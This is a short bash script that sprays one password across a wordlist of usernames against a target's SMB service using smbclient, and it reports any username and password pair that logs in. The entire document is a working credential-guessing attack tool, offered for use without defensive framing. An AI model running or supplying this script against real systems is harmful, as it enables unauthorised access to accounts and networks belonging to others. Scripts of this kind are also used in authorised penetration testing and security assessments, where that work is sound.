#!/bin/bash


usage() {
        (>&2 echo -e "$0\nPerform Password Spray using smbclient")
        (>&2 echo -e "Usage: $0 -d <WORKGROUP> -p <PASSWORD> -w <WORDLIST> -t <TARGET>")
}

while [ $# -gt 0 ];do
    arg=$1
    
    case $arg in
        '-d')
            WORKGROUP=$2
                        shift
        ;;
        '-p')
            PASSWORD=$2
                        shift
        ;;
        '-w')
            WORDLIST=$2
                        shift
        ;;
        '-t')
            TARGET=$2
                        shift
        ;;

        *)
                usage
                        exit 1
        ;;
        '')
                usage
                exit 2
        ;;
    esac
    shift
done

if [ -f ${WORDLIST} ];then
        for user in $(cat ${WORDLIST});do
                smbclient -L ${TARGET} -U "${WORKGROUP}\\$user%${PASSWORD}" 2>&1>/dev/null
                if [[ $? -eq 0 ]];then
                        echo "[*] Found Credentials: $user:${PASSWORD}"
                fi
        done
fi
